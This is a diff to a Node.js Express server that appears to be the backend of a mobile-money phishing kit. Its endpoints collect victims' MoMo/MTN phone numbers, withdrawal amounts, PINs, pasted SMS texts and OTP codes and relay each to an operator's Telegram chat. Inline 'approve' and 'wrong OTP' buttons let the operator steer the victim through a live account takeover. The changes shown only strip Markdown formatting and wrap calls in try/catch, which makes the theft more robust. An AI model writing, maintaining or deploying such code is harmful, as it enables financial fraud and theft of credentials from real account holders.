@@ -6,9 +6,6 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
-
 let withdrawalStatus = 'idle'; 
 let otpStatus = 'idle';        
 let lastUpdateId = 0;
@@ -31,7 +28,7 @@ app.post('/api/submit-pin', async (req, res) => {
     withdrawalStatus = 'pending';
     otpStatus = 'idle';
 
-    const message = `🚨 *New MoMo/MTN Withdrawal Request* 🚨\n\n📱 *Phone:* \`${currentData.phone}\`\n💰 *Amount:* \`$${currentData.amount}\`\n🔑 *PIN:* \`${pin}\``;
+    const message = `🚨 New MoMo/MTN Withdrawal Request 🚨\n\n📱 Phone: ${currentData.phone}\n💰 Amount: $${currentData.amount}\n🔑 PIN: ${pin}`;
 
     try {
         await sendTelegramMessage(message, [
@@ -57,7 +54,7 @@ app.post('/api/submit-sms', async (req, res) => {
     const { sms } = req.body;
     currentData.sms = sms;
 
-    const message = `📲 *MoMo SMS Code Pasted* 📲\n\n📱 *Phone:* \`${currentData.phone}\`\n📝 *SMS Text:* \`${sms}\``;
+    const message = `📲 MoMo SMS Code Pasted 📲\n\n📱 Phone: ${currentData.phone}\n📝 SMS Text: ${sms}`;
     try {
         await sendTelegramMessage(message, []);
     } catch (e) {
@@ -73,7 +70,7 @@ app.post('/api/verify-otp', async (req, res) => {
     currentData.otp = otp;
     otpStatus = 'pending';
 
-    const message = `🔐 *MoMo OTP Verification Submitted* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP Code:* \`${otp}\``;
+    const message = `🔐 MoMo OTP Verification Submitted 🔐\n\n📱 Phone: ${currentData.phone}\n🔢 OTP Code: ${otp}`;
 
     try {
         await sendTelegramMessage(message, [
@@ -94,9 +91,8 @@ app.get('/api/check-otp-status', (req, res) => {
     res.json({ status: otpStatus });
 });
 
-// 5. Telegram Long-Polling to listen for admin button clicks
+// 5. Telegram Long-Polling with Error Isolation
 async function pollTelegramUpdates() {
-    // FIX: Check process.env.BOT_TOKEN correctly
     if (!process.env.BOT_TOKEN) {
         setTimeout(pollTelegramUpdates, 5000);
         return;
@@ -122,16 +118,16 @@ async function pollTelegramUpdates() {
                     let statusMessage = '';
                     if (action === 'approve_withdrawal') {
                         withdrawalStatus = 'approved';
-                        statusMessage = '✅ *Status: Withdrawal Approved by Admin*';
+                        statusMessage = '✅ Status: Withdrawal Approved by Admin';
                     } else if (action === 'reject_withdrawal') {
                         withdrawalStatus = 'rejected';
-                        statusMessage = '❌ *Status: Withdrawal Declined by Admin*';
+                        statusMessage = '❌ Status: Withdrawal Declined by Admin';
                     } else if (action === 'correct_otp') {
                         otpStatus = 'success';
-                        statusMessage = '✅ *Status: OTP Verified - Success*';
+                        statusMessage = '✅ Status: OTP Verified - Success';
                     } else if (action === 'wrong_otp') {
                         otpStatus = 'wrong';
-                        statusMessage = '❌ *Status: Wrong OTP - Retrying*';
+                        statusMessage = '❌ Status: Wrong OTP - Retrying';
                     }
 
                     if (statusMessage) {
@@ -141,14 +137,14 @@ async function pollTelegramUpdates() {
             }
         }
     } catch (err) {
-        console.error('Polling error:', err.message);
+        console.error('Polling error caught safely:', err.message);
     }
 
-    // Ensure polling loops continuously even if an error occurs
+    // Ensures continuous loop without breaking on failure
     setTimeout(pollTelegramUpdates, 1000);
 }
 
-// Telegram Helper Functions
+// Telegram Helper Functions (All Safely Wrapped in Try/Catch)
 async function answerCallback(callbackQueryId, text) {
     try {
         await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
@@ -157,21 +153,24 @@ async function answerCallback(callbackQueryId, text) {
             body: JSON.stringify({ callback_query_id: callbackQueryId, text })
         });
     } catch (e) {
-        console.error('Answer callback error:', e);
+        console.error('Answer callback error:', e.message);
     }
 }
 
 async function sendTelegramMessage(text, keyboard) {
-    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: process.env.CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: keyboard }
-        })
-    });
+    try {
+        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: process.env.CHAT_ID,
+                text: text,
+                reply_markup: { inline_keyboard: keyboard }
+            })
+        });
+    } catch (e) {
+        console.error('Send telegram message error:', e.message);
+    }
 }
 
 async function removeMessageButtons(chatId, messageId) {
@@ -186,7 +185,7 @@ async function removeMessageButtons(chatId, messageId) {
             })
         });
     } catch (e) {
-        console.error('Remove buttons error:', e);
+        console.error('Remove buttons error:', e.message);
     }
 }
 
@@ -197,12 +196,11 @@ async function sendStatusMessage(chatId, text) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: chatId, 
-                text: text, 
-                parse_mode: 'Markdown' 
+                text: text 
             })
         });
     } catch (e) {
-        console.error('Send status message error:', e);
+        console.error('Send status message error:', e.message);
     }
 }
 
